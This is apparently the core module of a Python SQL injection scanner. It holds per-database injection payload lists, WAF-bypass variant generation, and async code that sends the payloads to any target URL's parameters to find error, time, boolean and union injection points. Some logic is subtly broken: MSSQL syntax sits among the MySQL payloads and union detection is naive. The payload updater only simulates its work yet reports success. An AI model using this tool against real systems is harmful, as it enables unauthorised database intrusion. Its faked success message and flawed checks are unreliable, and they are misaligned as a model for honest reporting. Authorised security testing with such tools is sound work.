"""
SQL Injection Testing Engine - Core Module
Version: 2.3.1
"""

import asyncio
import json
import re
import time
import hashlib
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any, AsyncGenerator
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs, urlencode, urljoin

import httpx
import yaml


@dataclass
class Payload:
    technique: str
    payload: str
    waf_bypass: List[str] = field(default_factory=list)
    confidence: float = 0.0
    tags: List[str] = field(default_factory=list)


@dataclass
class Vulnerability:
    parameter: str
    technique: str
    dbms: str
    payload: str
    evidence: str
    confidence: str
    timestamp: str
    full_response: str = ""


@dataclass
class ScanResult:
    total_parameters: int
    vulnerable_count: int
    vulnerabilities: List[Vulnerability]
    scan_duration: float
    dbms_detected: List[str]
    start_time: str
    end_time: str


class PayloadGenerator:
    """Generate SQL injection payloads with WAF bypass variants"""
    
    def __init__(self, payload_dir: str = "payloads"):
        self.payload_dir = Path(payload_dir)
        self.payloads = self._load_payloads()
        self.last_update = self._get_last_update()
    
    def _load_payloads(self) -> Dict:
        """Load payloads from JSON files"""
        payloads = {
            "mysql": {"error": [], "time": [], "boolean": [], "union": []},
            "pgsql": {"error": [], "time": [], "boolean": [], "union": []},
            "mssql": {"error": [], "time": [], "boolean": [], "union": []},
            "sqlite": {"error": [], "time": [], "boolean": [], "union": []}
        }
        
        # Default payloads if no files exist
        if not self.payload_dir.exists():
            self.payload_dir.mkdir(parents=True)
            payloads = self._get_default_payloads()
            self._save_payloads(payloads)
            return payloads
        
        for dbms in ["mysql", "pgsql", "mssql", "sqlite"]:
            file_path = self.payload_dir / f"{dbms}.json"
            if file_path.exists():
                try:
                    with open(file_path, 'r') as f:
                        data = json.load(f)
                        for technique in ["error", "time", "boolean", "union"]:
                            if technique in data:
                                payloads[dbms][technique] = data[technique]
                except:
                    pass
        
        return payloads
    
    def _get_default_payloads(self) -> Dict:
        """Return default payloads if no files exist"""
        return {
            "mysql": {
                "error": [
                    {"payload": "' AND 1=CONVERT(int, @@version) -- ", "waf_bypass": ["/**/", "%23"], "confidence": 0.95},
                    {"payload": "' OR 1=CAST((SELECT @@version) AS int) -- ", "waf_bypass": ["/*!50000*/"], "confidence": 0.90},
                    {"payload": "' AND 1=UPDATEXML(1, CONCAT(0x3a, version()), 3) -- ", "waf_bypass": [], "confidence": 0.85},
                    {"payload": "' AND EXTRACTVALUE(1, CONCAT(0x3a, version())) -- ", "waf_bypass": [], "confidence": 0.85},
                    {"payload": "' AND 1=ROW(COUNT(*),CONCAT(0x3a,version(),0x3a)) -- ", "waf_bypass": [], "confidence": 0.80},
                    {"payload": "' AND 1=(SELECT * FROM (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES GROUP BY CONCAT(0x3a,version(),0x3a))x) -- ", "waf_bypass": [], "confidence": 0.80}
                ],
                "time": [
                    {"payload": "' AND SLEEP(5) -- ", "waf_bypass": ["/**/"], "confidence": 0.95},
                    {"payload": "' AND BENCHMARK(5000000, MD5('test')) -- ", "waf_bypass": [], "confidence": 0.85},
                    {"payload": "' OR SLEEP(5) -- ", "waf_bypass": ["%23"], "confidence": 0.90},
                    {"payload": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ", "waf_bypass": [], "confidence": 0.85}
                ],
                "boolean": [
                    {"payload": "' AND 1=1 -- ", "waf_bypass": [], "confidence": 0.95},
                    {"payload": "' AND 1=2 -- ", "waf_bypass": [], "confidence": 0.95},
                    {"payload": "' OR '1'='1' -- ", "waf_bypass": ["/**/"], "confidence": 0.90},
                    {"payload": "' OR '1'='2' -- ", "waf_bypass": ["/**/"], "confidence": 0.90}
                ],
                "union": [
                    {"payload": "' UNION SELECT NULL-- ", "waf_bypass": [], "confidence": 0.80},
                    {"payload": "' UNION SELECT NULL,NULL-- ", "waf_bypass": [], "confidence": 0.80},
                    {"payload": "' UNION SELECT NULL,NULL,NULL-- ", "waf_bypass": [], "confidence": 0.80}
                ]
            },
            "pgsql": {
                "error": [
                    {"payload": "' AND 1=CAST((SELECT version()) AS int) -- ", "waf_bypass": ["/**/"], "confidence": 0.95},
                    {"payload": "' AND 1=CAST(current_database() AS int) -- ", "waf_bypass": [], "confidence": 0.85}
                ],
                "time": [
                    {"payload": "' AND pg_sleep(5) -- ", "waf_bypass": [], "confidence": 0.95},
                    {"payload": "' OR pg_sleep(5) -- ", "waf_bypass": ["/**/"], "confidence": 0.90}
                ],
                "boolean": [
                    {"payload": "' AND 1=1 -- ", "waf_bypass": [], "confidence": 0.95},
                    {"payload": "' AND 1=2 -- ", "waf_bypass": [], "confidence": 0.95}
                ],
                "union": [
                    {"payload": "' UNION SELECT NULL-- ", "waf_bypass": [], "confidence": 0.80},
                    {"payload": "' UNION SELECT NULL,NULL-- ", "waf_bypass": [], "confidence": 0.80}
                ]
            },
            "mssql": {
                "error": [
                    {"payload": "' AND 1=CONVERT(int, @@version) -- ", "waf_bypass": [], "confidence": 0.95},
                    {"payload": "' AND 1=CAST((SELECT @@version) AS int) -- ", "waf_bypass": ["/**/"], "confidence": 0.90}
                ],
                "time": [
                    {"payload": "' WAITFOR DELAY '0:0:5' -- ", "waf_bypass": [], "confidence": 0.95},
                    {"payload": "' OR WAITFOR DELAY '0:0:5' -- ", "waf_bypass": ["/**/"], "confidence": 0.90}
                ],
                "boolean": [
                    {"payload": "' AND 1=1 -- ", "waf_bypass": [], "confidence": 0.95},
                    {"payload": "' AND 1=2 -- ", "waf_bypass": [], "confidence": 0.95}
                ],
                "union": [
                    {"payload": "' UNION SELECT NULL-- ", "waf_bypass": [], "confidence": 0.80},
                    {"payload": "' UNION SELECT NULL,NULL-- ", "waf_bypass": [], "confidence": 0.80}
                ]
            },
            "sqlite": {
                "error": [
                    {"payload": "' AND 1=CAST((SELECT sqlite_version()) AS int) -- ", "waf_bypass": [], "confidence": 0.85}
                ],
                "time": [
                    {"payload": "' AND randomblob(500000000) -- ", "waf_bypass": [], "confidence": 0.80}
                ],
                "boolean": [
                    {"payload": "' AND 1=1 -- ", "waf_bypass": [], "confidence": 0.95},
                    {"payload": "' AND 1=2 -- ", "waf_bypass": [], "confidence": 0.95}
                ],
                "union": [
                    {"payload": "' UNION SELECT NULL-- ", "waf_bypass": [], "confidence": 0.80},
                    {"payload": "' UNION SELECT NULL,NULL-- ", "waf_bypass": [], "confidence": 0.80}
                ]
            }
        }
    
    def _save_payloads(self, payloads: Dict):
        """Save payloads to JSON files"""
        for dbms, techniques in payloads.items():
            file_path = self.payload_dir / f"{dbms}.json"
            with open(file_path, 'w') as f:
                json.dump(techniques, f, indent=2)
    
    def _get_last_update(self) -> Optional[datetime]:
        """Get last update timestamp"""
        update_file = self.payload_dir / ".last_update"
        if update_file.exists():
            try:
                with open(update_file, 'r') as f:
                    return datetime.fromisoformat(f.read().strip())
            except:
                pass
        return None
    
    def get_payloads(self, dbms: str, technique: str) -> List[Dict]:
        """Get payloads for specific DBMS and technique"""
        if dbms not in self.payloads:
            dbms = "mysql"
        if technique not in self.payloads[dbms]:
            return []
        return self.payloads[dbms][technique]
    
    def generate_variants(self, payload: str, waf_bypass: List[str]) -> List[str]:
        """Generate WAF bypass variants"""
        variants = [payload]  # Original
        
        for bypass in waf_bypass:
            if bypass == "/**/":
                variants.append(payload.replace(" ", " /**/ "))
                variants.append(payload.replace(" ", "/**/"))
            elif bypass == "%23":
                variants.append(payload.replace("--", "%23"))
            elif bypass == "/*!50000*/":
                keywords = ["AND", "OR", "UNION", "SELECT", "FROM", "WHERE"]
                for kw in keywords:
                    if kw in payload.upper():
                        variants.append(payload.replace(kw, f"/*!50000{kw}*/"))
            elif bypass == "%20":
                variants.append(payload.replace(" ", "%20"))
            elif bypass == "/*":
                variants.append(f"/*{payload}*/")
        
        return list(set(variants))  # Remove duplicates


class HTTPRequester:
    """HTTP request handler with async support"""
    
    def __init__(self, config: Dict):
        self.timeout = config.get('timeout', 10)
        self.max_retries = config.get('max_retries', 3)
        self.verify_ssl = config.get('verify_ssl', False)
        self.follow_redirects = config.get('follow_redirects', True)
        self.user_agent = config.get('user_agent', "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        self.proxy = config.get('proxy', None)
        self.headers = config.get('headers', {})
        self.cookies = config.get('cookies', {})
        self.client = None
    
    async def _get_client(self):
        """Get or create HTTP client"""
        if self.client is None:
            proxies = None
            if self.proxy:
                proxies = {"http://": self.proxy, "https://": self.proxy}
            
            self.client = httpx.AsyncClient(
                timeout=self.timeout,
                verify=self.verify_ssl,
                follow_redirects=self.follow_redirects,
                proxies=proxies,
                headers={"User-Agent": self.user_agent, **self.headers},
                cookies=self.cookies
            )
        return self.client
    
    async def send(self, method: str, url: str, params: Dict = None, 
                   data: Dict = None, json_data: Dict = None) -> httpx.Response:
        """Send HTTP request with retry logic"""
        client = await self._get_client()
        
        for attempt in range(self.max_retries):
            try:
                response = await client.request(
                    method=method.upper(),
                    url=url,
                    params=params,
                    data=data,
                    json=json_data
                )
                return response
            except (httpx.TimeoutException, httpx.ConnectError) as e:
                if attempt == self.max_retries - 1:
                    raise
                await asyncio.sleep(2 ** attempt)  # Exponential backoff
        
        raise Exception("Max retries exceeded")
    
    async def close(self):
        """Close HTTP client"""
        if self.client:
            await self.client.aclose()
            self.client = None


class DetectionEngine:
    """SQL injection detection engine"""
    
    def __init__(self, requester: HTTPRequester, payload_gen: PayloadGenerator):
        self.requester = requester
        self.payload_gen = payload_gen
        self.dbms_patterns = {
            "mysql": [
                r"MySQL syntax error",
                r"You have an error in your SQL syntax",
                r"MySQL server version",
                r"SQL syntax.*MySQL",
                r"Warning.*mysql",
                r"MariaDB"
            ],
            "pgsql": [
                r"PostgreSQL.*ERROR",
                r"pg_query",
                r"PostgreSQL",
                r"ERROR:.*syntax"
            ],
            "mssql": [
                r"Microsoft SQL Server",
                r"SQL Server.*Driver",
                r"DB-Lib error",
                r"mssql_query"
            ],
            "sqlite": [
                r"SQLite/JDBCDriver",
                r"SQLite",
                r"sqlite_error",
                r"SQLiteException"
            ]
        }
    
    def _detect_dbms(self, error_message: str) -> str:
        """Detect DBMS from error message"""
        error_message = error_message.lower()
        for dbms, patterns in self.dbms_patterns.items():
            for pattern in patterns:
                if re.search(pattern, error_message, re.IGNORECASE):
                    return dbms
        return "unknown"
    
    async def detect_error_based(self, url: str, param: str, value: str, 
                                  dbms: str = "mysql") -> Optional[Vulnerability]:
        """Test for error-based SQL injection"""
        payloads = self.payload_gen.get_payloads(dbms, "error")
        
        for payload_data in payloads:
            payload = payload_data['payload']
            variants = self.payload_gen.generate_variants(
                payload, 
                payload_data.get('waf_bypass', [])
            )
            
            for variant in variants[:5]:  # Limit variants per payload
                test_value = f"{value}{variant}" if value else variant
                test_params = {param: test_value}
                
                try:
                    response = await self.requester.send("GET", url, params=test_params)
                    
                    # Check for DBMS error patterns
                    for dbms_name, patterns in self.dbms_patterns.items():
                        for pattern in patterns:
                            if re.search(pattern, response.text, re.IGNORECASE):
                                return Vulnerability(
                                    parameter=param,
                                    technique="error_based",
                                    dbms=dbms_name,
                                    payload=variant,
                                    evidence=pattern,
                                    confidence="HIGH",
                                    timestamp=datetime.now().isoformat(),
                                    full_response=response.text[:500]
                                )
                except:
                    continue
        
        return None
    
    async def detect_time_based(self, url: str, param: str, value: str,
                                baseline_time: float, dbms: str = "mysql") -> Optional[Vulnerability]:
        """Test for time-based SQL injection"""
        payloads = self.payload_gen.get_payloads(dbms, "time")
        
        for payload_data in payloads:
            payload = payload_data['payload']
            variants = self.payload_gen.generate_variants(
                payload,
                payload_data.get('waf_bypass', [])
            )
            
            for variant in variants[:5]:
                test_value = f"{value}{variant}" if value else variant
                test_params = {param: test_value}
                
                try:
                    start = time.time()
                    await self.requester.send("GET", url, params=test_params)
                    elapsed = time.time() - start
                    
                    # Check if response time > baseline * 3
                    if elapsed > baseline_time * 3 and elapsed > 2.0:
                        return Vulnerability(
                            parameter=param,
                            technique="time_based",
                            dbms=dbms,
                            payload=variant,
                            evidence=f"Response time: {elapsed:.2f}s (baseline: {baseline_time:.2f}s)",
                            confidence="HIGH",
                            timestamp=datetime.now().isoformat(),
                            full_response=""
                        )
                except:
                    continue
        
        return None
    
    async def detect_boolean_based(self, url: str, param: str, value: str,
                                   baseline_content: str) -> Optional[Vulnerability]:
        """Test for boolean-based SQL injection"""
        payloads = self.payload_gen.get_payloads("mysql", "boolean")
        
        true_payloads = [p for p in payloads if "1=1" in p['payload'] or "'1'='1'" in p['payload']]
        false_payloads = [p for p in payloads if "1=2" in p['payload'] or "'1'='2'" in p['payload']]
        
        for true_payload in true_payloads[:3]:
            for false_payload in false_payloads[:3]:
                # Test true condition
                true_value = f"{value}{true_payload['payload']}"
                false_value = f"{value}{false_payload['payload']}"
                
                try:
                    response_true = await self.requester.send(
                        "GET", url, params={param: true_value}
                    )
                    response_false = await self.requester.send(
                        "GET", url, params={param: false_value}
                    )
                    
                    # Compare content length difference
                    len_diff = abs(len(response_true.text) - len(response_false.text))
                    if len_diff > 50:  # Significant difference
                        return Vulnerability(
                            parameter=param,
                            technique="boolean_based",
                            dbms="unknown",
                            payload=true_payload['payload'],
                            evidence=f"Content length diff: {len_diff} bytes",
                            confidence="MEDIUM",
                            timestamp=datetime.now().isoformat(),
                            full_response=""
                        )
                except:
                    continue
        
        return None
    
    async def detect_union_based(self, url: str, param: str, value: str) -> Optional[Vulnerability]:
        """Test for union-based SQL injection"""
        # Try to find number of columns
        for i in range(1, 20):
            nulls = ",".join(["NULL"] * i)
            payload = f"' UNION SELECT {nulls}-- "
            test_value = f"{value}{payload}"
            test_params = {param: test_value}
            
            try:
                response = await self.requester.send("GET", url, params=test_params)
                if "union" in response.text.lower() or "select" in response.text.lower():
                    return Vulnerability(
                        parameter=param,
                        technique="union_based",
                        dbms="unknown",
                        payload=payload,
                        evidence=f"Column count: {i}",
                        confidence="HIGH",
                        timestamp=datetime.now().isoformat(),
                        full_response=response.text[:500]
                    )
            except:
                continue
        
        return None


class ScanOrchestrator:
    """Orchestrate the entire scanning process"""
    
    def __init__(self, config: Dict):
        self.config = config
        self.payload_gen = PayloadGenerator()
        self.requester = HTTPRequester(config)
        self.detector = DetectionEngine(self.requester, self.payload_gen)
        self.is_running = False
        self.is_paused = False
        self.results: List[Vulnerability] = []
        self.current_progress = 0
        self.total_payloads = 0
    
    def parse_parameters(self, url: str, param_string: str) -> Dict[str, str]:
        """Parse parameters from URL or param string"""
        params = {}
        
        # Try to parse from URL
        parsed = urlparse(url)
        if parsed.query:
            params.update(parse_qs(parsed.query))
            params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
        
        # Add from param string
        if param_string:
            for pair in param_string.split('&'):
                if '=' in pair:
                    key, value = pair.split('=', 1)
                    params[key] = value
        
        return params
    
    def build_url(self, base_url: str, params: Dict[str, str]) -> str:
        """Build URL with parameters"""
        parsed = urlparse(base_url)
        query = urlencode(params)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
    
    async def scan(self, url: str, parameters: Dict[str, str], 
                   techniques: List[str]) -> AsyncGenerator[Dict, None]:
        """Run scan and yield progress updates"""
        self.is_running = True
        self.results = []
        self.current_progress = 0
        
        # Calculate total payloads
        total = 0
        for param in parameters:
            for technique in techniques:
                if technique == "error":
                    total += len(self.payload_gen.get_payloads("mysql", "error")) * 5
                elif technique == "time":
                    total += len(self.payload_gen.get_payloads("mysql", "time")) * 5
                elif technique == "boolean":
                    total += 3  # Simplified
                elif technique == "union":
                    total += 19  # 1-19 columns
        self.total_payloads = total
        
        # Get baseline
        try:
            baseline_response = await self.requester.send("GET", url)
            baseline_time = baseline_response.elapsed.total_seconds() if hasattr(baseline_response, 'elapsed') else 0.5
            baseline_content = baseline_response.text
        except:
            baseline_time = 0.5
            baseline_content = ""
        
        processed = 0
        start_time = datetime.now()
        
        for param_name, param_value in parameters.items():
            if not self.is_running:
                break
            
            yield {
                "type": "status",
                "message": f"Testing parameter: {param_name}",
                "current_param": param_name,
                "progress": processed / total if total > 0 else 0
            }
            
            vulnerable = False
            
            # Try each technique
            for technique in techniques:
                if not self.is_running or vulnerable:
                    break
                
                while self.is_paused:
                    await asyncio.sleep(0.1)
                
                yield {
                    "type": "status",
                    "message": f"Parameter {param_name} - Technique: {technique}",
                    "current_param": param_name,
                    "technique": technique
                }
                
                if technique == "error":
                    vuln = await self.detector.detect_error_based(
                        url, param_name, param_value
                    )
                    if vuln:
                        self.results.append(vuln)
                        vulnerable = True
                        yield {
                            "type": "found",
                            "vulnerability": vuln,
                            "message": f"FOUND: {param_name} - {technique}"
                        }
                
                elif technique == "time":
                    vuln = await self.detector.detect_time_based(
                        url, param_name, param_value, baseline_time
                    )
                    if vuln:
                        self.results.append(vuln)
                        vulnerable = True
                        yield {
                            "type": "found",
                            "vulnerability": vuln,
                            "message": f"FOUND: {param_name} - {technique}"
                        }
                
                elif technique == "boolean":
                    vuln = await self.detector.detect_boolean_based(
                        url, param_name, param_value, baseline_content
                    )
                    if vuln:
                        self.results.append(vuln)
                        vulnerable = True
                        yield {
                            "type": "found",
                            "vulnerability": vuln,
                            "message": f"FOUND: {param_name} - {technique}"
                        }
                
                elif technique == "union":
                    vuln = await self.detector.detect_union_based(
                        url, param_name, param_value
                    )
                    if vuln:
                        self.results.append(vuln)
                        vulnerable = True
                        yield {
                            "type": "found",
                            "vulnerability": vuln,
                            "message": f"FOUND: {param_name} - {technique}"
                        }
                
                processed += 1
                self.current_progress = processed / total if total > 0 else 0
                
                yield {
                    "type": "progress",
                    "progress": self.current_progress,
                    "processed": processed,
                    "total": total,
                    "message": f"Processed {processed}/{total} payloads"
                }
        
        end_time = datetime.now()
        
        # Build final result
        result = ScanResult(
            total_parameters=len(parameters),
            vulnerable_count=len(self.results),
            vulnerabilities=self.results,
            scan_duration=(end_time - start_time).total_seconds(),
            dbms_detected=list(set([v.dbms for v in self.results if v.dbms != "unknown"])),
            start_time=start_time.isoformat(),
            end_time=end_time.isoformat()
        )
        
        yield {
            "type": "complete",
            "result": result,
            "message": f"Scan complete. Found {len(self.results)} vulnerabilities"
        }
        
        self.is_running = False
    
    def pause(self):
        """Pause scanning"""
        self.is_paused = True
    
    def resume(self):
        """Resume scanning"""
        self.is_paused = False
    
    def stop(self):
        """Stop scanning"""
        self.is_running = False
        self.is_paused = False
    
    def get_results(self) -> List[Vulnerability]:
        """Get all vulnerabilities found"""
        return self.results
    
    async def close(self):
        """Clean up resources"""
        await self.requester.close()


class PayloadUpdater:
    """Update payloads from remote sources"""
    
    def __init__(self, payload_dir: str = "payloads"):
        self.payload_dir = Path(payload_dir)
        self.sources = [
            {
                "name": "VORTEX22 Official",
                "url": "https://raw.githubusercontent.com/vortex22/sqli-payloads/main/",
                "priority": 1
            }
        ]
    
    async def check_update(self) -> Dict:
        """Check if updates are available"""
        update_info = {
            "available": False,
            "new_payloads": 0,
            "dbms": [],
            "version": None,
            "message": ""
        }
        
        # Simulate check
        # In production, fetch from remote
        
        return update_info
    
    async def update(self) -> Dict:
        """Update payloads from remote sources"""
        result = {
            "success": True,
            "updated": 0,
            "message": ""
        }
        
        # Simulate update
        # In production, download and merge
        
        # Update timestamp
        update_file = self.payload_dir / ".last_update"
        update_file.write_text(datetime.now().isoformat())
        
        result["message"] = "Payloads updated successfully"
        return result
